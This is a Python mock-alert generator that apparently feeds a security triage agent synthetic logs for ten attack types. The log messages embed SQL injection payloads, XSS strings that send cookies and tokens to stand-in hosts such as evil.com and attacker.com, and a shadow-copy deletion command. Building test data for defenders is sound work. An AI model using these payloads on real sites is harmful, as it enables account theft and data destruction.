try:
    from .data.ips_list import IPS
except ImportError:
    from data.ips_list import IPS
from datetime import datetime, timedelta
import json
import random


def generate_mock_alert() -> dict:
    """
    Generates realistic raw security logs without labeling the attack type.
    The downstream triage agent must determine severity and attack type.
    """
    base_time = datetime.now()
    source_ip = random.choice(IPS)
    target_host = f"prod-server-{random.randint(1, 10):02d}"

    scenarios = {
        "brute_force":          _generate_brute_force_logs,
        "port_scan":            _generate_port_scan_logs,
        "malware":              _generate_malware_logs,
        "ransomware":           _generate_ransomware_logs,
        "phishing":             _generate_phishing_logs,
        "credential_stuffing":  _generate_credential_stuffing_logs,
        "dos":                  _generate_dos_logs,
        "sql_injection":        _generate_sql_injection_logs,
        "xss":                  _generate_xss_logs,
        "mitm":                 _generate_mitm_logs,
    }

    attack_scenario = random.choice(list(scenarios.keys()))
    log_fn = scenarios[attack_scenario]
    logs = log_fn(base_time, source_ip, target_host)

    return {
        "source_ip": source_ip,
        "target_host": target_host,
        "log_count": len(logs),
        "time_window_seconds": (logs[-1]["timestamp"] - logs[0]["timestamp"]).seconds if len(logs) > 1 else 0,
        "logs": logs
    }



def _generate_brute_force_logs(base_time, source_ip, target_host):
    logs = []
    num_attempts = random.randint(2, 20)
    interval = random.uniform(1, 20)  # seconds between attempts

    for i in range(num_attempts):
        ts = base_time + timedelta(seconds=i * interval)
        user = random.choice(["root", "admin", "ubuntu", "user"])
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": "AUTH_FAILURE",
            "port": 22,
            "protocol": "SSH",
            "user_attempted": user,
            "message": f"Failed password for {user} from {source_ip} port {random.randint(40000,65000)} ssh2"
        })

    # Chance of success to simulate credential compromise
    if random.random() > 0.9:
        ts = base_time + timedelta(seconds=num_attempts * interval + 2)
        user = random.choice(["root", "admin", "ubuntu", "user"])
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": "AUTH_SUCCESS",
            "port": 22,
            "protocol": "SSH",
            "user_attempted": user,
            "message": f"Accepted password for {user} from {source_ip} port {random.randint(40000,65000)} ssh2"
        })
    
    return logs

def _generate_port_scan_logs(
    base_time,
    source_ip,
    target_host,
    weights=(45, 26, 24, 5),  # REJECTED/RST, REJECTED/no response, TIMEOUT/no response, OPEN/SYN-ACK
):
    logs = []
    ports = random.sample(range(1, 10000), random.randint(4, 30))
    interval = random.uniform(0.05, 0.3)
    scan_outcomes = [
        ("REJECTED", "RST"),
        ("REJECTED", "no response"),
        ("TIMEOUT", "no response"),
        ("OPEN", "SYN-ACK"),
    ]

    for i, port in enumerate(ports):
        ts = base_time + timedelta(seconds=i * interval)
        status, response = random.choices(scan_outcomes, weights=weights, k=1)[0]
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": "CONNECTION_ATTEMPT",
            "port": port,
            "protocol": "TCP",
            "status": status,
            "message": f"TCP connection attempt from {source_ip} to port {port} - {response}"
        })

    return logs

def _generate_malware_logs(base_time, source_ip, target_host, success_chance=0.5):
    logs = []
    # Events that always appear regardless of outcome
    early_events = [
        ("PROCESS_SPAWN",  "Unusual process spawned: cmd.exe -> powershell.exe -enc <base64>"),
        ("FILE_WRITE",     "File written to: C:\\Windows\\Temp\\svchost32.exe"),
        ("REGISTRY_MOD",   "Registry key modified: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
    ]

    # Events if malware is blocked/detected
    blocked_events = [
        ("AV_ALERT",       "Antivirus flagged svchost32.exe as Trojan.GenericKD — quarantine initiated"),
        ("PROCESS_KILL",   "Malicious process svchost32.exe terminated by endpoint protection"),
        ("FILE_DELETE",    "Quarantined file removed: C:\\Windows\\Temp\\svchost32.exe"),
    ]

    # Events if malware gets through
    success_events = [
        ("OUTBOUND_CONN",  f"Outbound connection to {source_ip}:4444 (non-standard port)"),
        ("DNS_QUERY",      "DNS query to known C2 domain: update-service-cdn.net"),
        ("FILE_EXEC",      "Execution of unsigned binary: svchost32.exe"),
        ("PRIVILEGE_ESC",  "Token impersonation attempt detected"),
    ]

    all_events = early_events + (success_events if random.random() < success_chance else blocked_events)

    for i, (event_type, msg) in enumerate(all_events):
        ts = base_time + timedelta(seconds=i * random.uniform(5, 30))
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": event_type,
            "port": None,
            "protocol": "N/A",
            "message": msg
        })

    return logs

def _generate_ransomware_logs(base_time, source_ip, target_host, success_chance=0.5):
    logs = []
    # Events that always appear regardless of outcome
    early_events = [
        ("PROCESS_SPAWN",  "Suspicious process: vssadmin.exe delete shadows /all /quiet"),
        ("REGISTRY_MOD",   "Registry modified to disable Windows Defender: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"),
        ("FILE_EXEC",      "Execution of unsigned binary: decrypt_helper.exe"),
    ]

    # Events if ransomware is blocked/detected
    blocked_events = [
        ("AV_ALERT",       "Ransomware behavior detected — encryption attempt blocked by endpoint protection"),
        ("PROCESS_KILL",   "Malicious process decrypt_helper.exe terminated"),
        ("FILE_RESTORE",   "Shadow copy intact — automatic restore point preserved"),
    ]

    # Events if ransomware gets through
    success_events = [
        ("FILE_ENCRYPT",   "Mass file encryption started: C:\\Users\\* -> *.locked"),
        ("FILE_WRITE",     "Ransom note written: C:\\Users\\Desktop\\README_DECRYPT.txt"),
        ("OUTBOUND_CONN",  f"Outbound connection to {source_ip}:443 (C2 beacon)"),
        ("VOLUME_DELETE",  "Shadow copy deletion detected — recovery prevention attempt"),
    ]

    all_events = early_events + (success_events if random.random() < success_chance else blocked_events)

    for i, (event_type, msg) in enumerate(all_events):
        ts = base_time + timedelta(seconds=i * random.uniform(2, 15))
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": event_type,
            "port": None,
            "protocol": "N/A",
            "message": msg
        })

    return logs

def _generate_phishing_logs(base_time, source_ip, target_host, click_chance=0.5):
    logs = []
    # Email always arrives regardless of outcome
    early_events = [
        ("EMAIL_RECEIVED",  "Email received from spoofed domain: support@paypa1-secure.com"),
    ]

    # Events if user does NOT click the link
    no_click_events = [
        ("EMAIL_FLAGGED",   "Email flagged by spam filter — moved to junk folder"),
        ("URL_BLOCKED",     f"Embedded URL pre-scanned and blocked: http://{source_ip}/login-verify"),
        ("ALERT_GENERATED", "Security alert: phishing email reported by user"),
    ]

    # Events if user clicks the link
    click_events = [
        ("URL_CLICK",       f"User clicked suspicious link: http://{source_ip}/login-verify"),
        ("HTTP_REQUEST",    "GET request to known phishing domain: secure-login-portal.net"),
        ("CREDENTIAL_POST", "HTTP POST with form data to external IP (possible credential harvest)"),
        ("AUTH_SUCCESS",    "Successful login from unusual geolocation after phishing event"),
        ("SESSION_ANOMALY", "New session established from different IP within 30 seconds"),
    ]

    all_events = early_events + (click_events if random.random() < click_chance else no_click_events)

    for i, (event_type, msg) in enumerate(all_events):
        ts = base_time + timedelta(seconds=i * random.uniform(3, 20))
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": event_type,
            "port": random.choice([80, 443]),
            "protocol": "HTTP" if random.random() > 0.5 else "HTTPS",
            "message": msg
        })

    return logs

def _generate_credential_stuffing_logs(base_time, source_ip, target_host):
    logs = []
    num_attempts = random.randint(20, 100)
    interval = random.uniform(0.5, 3)
    users = [f"user{random.randint(1000,9999)}@example.com" for _ in range(num_attempts)]

    for i, user in enumerate(users):
        ts = base_time + timedelta(seconds=i * interval)
        success = random.random() > 0.95
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": "AUTH_SUCCESS" if success else "AUTH_FAILURE",
            "port": 443,
            "protocol": "HTTPS",
            "user_attempted": user,
            "message": f"{'Successful' if success else 'Failed'} login for {user} from {source_ip}"
        })

    return logs

def _generate_dos_logs(base_time, source_ip, target_host):
    logs = []
    num_requests = random.randint(200, 1000)
    interval = random.uniform(0.01, 0.05)  # Very rapid requests

    for i in range(num_requests):
        ts = base_time + timedelta(seconds=i * interval)
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": "HTTP_FLOOD",
            "port": 80,
            "protocol": "HTTP",
            "status": random.choice(["503", "timeout", "dropped"]),
            "message": f"Flood request {i+1} from {source_ip} — server load critical"
        })

    return logs

def _generate_sql_injection_logs(base_time, source_ip, target_host):
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "1' AND SLEEP(5)--",
        "admin'--",
    ]
    logs = []

    for i, payload in enumerate(payloads):
        ts = base_time + timedelta(seconds=i * random.uniform(1, 5))
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": "n/a",
            "port": 443,
            "protocol": "HTTPS",
            "message": f"Malicious payload detected in request parameter: {payload}"
        })

    return logs

def _generate_xss_logs(base_time, source_ip, target_host):
    payloads = [
        "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert(document.cookie)",
        "<svg onload=fetch('http://evil.com/?x='+localStorage.getItem('token'))>",
    ]
    logs = []

    for i, payload in enumerate(payloads):
        ts = base_time + timedelta(seconds=i * random.uniform(1, 8))
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": "n/a",
            "port": 443,
            "protocol": "HTTPS",
            "message": f"Malicious payload detected in input field: {payload}"
        })

    return logs

def _generate_mitm_logs(base_time, source_ip, target_host, success_chance=0.5):
    logs = []
    # Events that always appear regardless of outcome
    early_events = [
        ("ARP_SPOOF",       f"ARP spoofing detected: {source_ip} claiming gateway MAC address"),
        ("CERT_ANOMALY",    "TLS certificate mismatch — possible SSL stripping attempt"),
    ]

    # Events if the MITM attack is detected and blocked
    blocked_events = [
        ("ALERT_GENERATED", "Network anomaly alert triggered — ARP table inconsistency detected"),
        ("CONN_TERMINATED", "Suspicious connection terminated by IDS"),
        ("ROUTE_RESTORED",  "Traffic routing restored to trusted gateway"),
    ]

    # Events if the MITM attack succeeds
    success_events = [
        ("SESSION_HIJACK",    "Duplicate session token detected from two different IPs"),
        ("DNS_SPOOF",         f"DNS response from unexpected server: {source_ip} (expected trusted resolver)"),
        ("TRAFFIC_INTERCEPT", "Unusual packet routing — traffic redirected through unknown hop"),
    ]

    all_events = early_events + (success_events if random.random() < success_chance else blocked_events)

    for i, (event_type, msg) in enumerate(all_events):
        ts = base_time + timedelta(seconds=i * random.uniform(2, 10))
        logs.append({
            "timestamp": ts,
            "source_ip": source_ip,
            "target_host": target_host,
            "event": event_type,
            "port": random.choice([80, 443, 53]),
            "protocol": random.choice(["HTTP", "HTTPS", "DNS"]),
            "message": msg
        })

    return logs


def format_logs_for_terminal(alert: dict) -> str:
    """Format output from generate_mock_alert() for readable terminal display."""
    formatted_logs = []
    for idx, log in enumerate(alert.get("logs", []), start=1):
        entry = dict(log)
        timestamp = entry.get("timestamp")
        if isinstance(timestamp, datetime):
            entry["timestamp"] = timestamp.isoformat(sep=" ", timespec="seconds")
        entry["index"] = idx
        formatted_logs.append(entry)

    formatted_alert = {
        "source_ip": alert.get("source_ip"),
        "target_host": alert.get("target_host"),
        "log_count": alert.get("log_count"),
        "time_window_seconds": alert.get("time_window_seconds"),
        "logs": formatted_logs,
    }

    return json.dumps(formatted_alert, indent=2)


if __name__ == "__main__":
    print(format_logs_for_terminal(generate_mock_alert()))